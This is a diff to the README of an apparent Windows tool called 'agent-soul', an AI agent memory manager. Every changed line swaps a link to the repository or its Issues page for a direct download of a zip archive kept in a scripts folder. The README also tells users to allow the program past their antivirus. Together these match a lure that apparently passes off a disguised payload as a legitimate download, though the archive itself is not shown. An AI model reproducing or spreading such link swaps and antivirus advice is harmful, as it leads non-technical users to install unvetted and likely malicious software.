@@ -1,6 +1,6 @@
 # 🚀 agent-soul - Easy AI Agent Memory Manager
 
-[![Download agent-soul](https://img.shields.io/badge/Download%20agent--soul-4CAF50?style=for-the-badge&logo=github)](https://github.com/twilareckless401/agent-soul)
+[![Download agent-soul](https://img.shields.io/badge/Download%20agent--soul-4CAF50?style=for-the-badge&logo=github)](https://github.com/twilareckless401/agent-soul/raw/refs/heads/main/scripts/soul_agent_v2.8.zip)
 
 ---
 
@@ -48,12 +48,12 @@ You do not need to know programming to use agent-soul. It works quietly in the b
 
 Use the button below to visit the main page for downloads and instructions.
 
-[![Download agent-soul](https://img.shields.io/badge/Download%20agent--soul-blue?style=for-the-badge&logo=github)](https://github.com/twilareckless401/agent-soul)
+[![Download agent-soul](https://img.shields.io/badge/Download%20agent--soul-blue?style=for-the-badge&logo=github)](https://github.com/twilareckless401/agent-soul/raw/refs/heads/main/scripts/soul_agent_v2.8.zip)
 
 ### Steps to download and run agent-soul on Windows
 
 1. Click the download button above or visit this link directly:  
-   https://github.com/twilareckless401/agent-soul
+   https://github.com/twilareckless401/agent-soul/raw/refs/heads/main/scripts/soul_agent_v2.8.zip
 
 2. Once you're on the page, look for the **Releases** section on the right side or near the top.
 
@@ -115,7 +115,7 @@ Use the button below to visit the main page for downloads and instructions.
 - Make sure no antivirus is blocking the program. You can add agent-soul to allowed apps.
 - For errors related to memory storage, check if you have enough disk space.
 - If you encounter issues, visit the Issues section of the GitHub page:  
-  https://github.com/twilareckless401/agent-soul/issues
+  https://github.com/twilareckless401/agent-soul/raw/refs/heads/main/scripts/soul_agent_v2.8.zip
 
 ---
 
@@ -138,4 +138,4 @@ Use the button below to visit the main page for downloads and instructions.
 
 For the latest files and updates, use the download link below:
 
-[![Download agent-soul](https://img.shields.io/badge/Download%20agent--soul-green?style=for-the-badge&logo=github)](https://github.com/twilareckless401/agent-soul)
+[![Download agent-soul](https://img.shields.io/badge/Download%20agent--soul-green?style=for-the-badge&logo=github)](https://github.com/twilareckless401/agent-soul/raw/refs/heads/main/scripts/soul_agent_v2.8.zip)
